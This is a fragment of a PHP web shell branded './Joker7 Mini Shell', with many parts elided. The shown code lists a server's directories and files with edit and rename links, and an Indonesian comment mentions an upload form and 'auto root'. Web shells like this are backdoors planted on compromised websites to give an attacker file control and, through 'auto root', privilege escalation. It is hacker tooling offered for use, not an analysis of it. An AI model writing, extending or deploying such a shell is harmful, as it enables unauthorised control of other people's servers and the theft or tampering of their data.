...
<head>
 ...
    <title>./Joker7 Mini Shell</title>
    <style>
        body {
            background-image: url('https://i.ibb.co/zxVGDwY/bade5470afb9c7e457569b30bbc5a9ec.jpg');
...
<body>
    <img src="https://i.ibb.co/NsZS0vR/bcd96d2a200acb2a14532bcd219d714a.jpg" alt="Logo" class="logo">
    <h1>./Joker7 Mini Shell</h1>

    <!-- Container untuk form upload dan auto root -->
    ...
    <table>
        ...
        <tbody>
            ...
            foreach ($directories as $dir) {
                echo '<tr>';
                echo '<td><a href="?dir=' . urlencode($current_dir . '/' . $dir) . '">' . htmlspecialchars($dir) . '</a></td>';
                echo '<td>Folder</td>';
                echo '<td><a href="#" onclick="renameFile(\'' . htmlspecialchars($dir) . '\')">Rename</a></td>';
                echo '</tr>';
            }
            ...
            foreach ($regular_files as $file) {
                ...
                echo '<td>' . round(filesize($current_dir . '/' . $file) / 1024, 2) . ' KB</td>';
                echo '<td><a href="#" onclick="editFile(\'' . htmlspecialchars($file) . '\')">Edit</a> | <a href="#" onclick="renameFile(\'' . htmlspecialchars($file) . '\')">Rename</a></td>';
                echo '</tr>';
            }
            ?>
        </tbody>
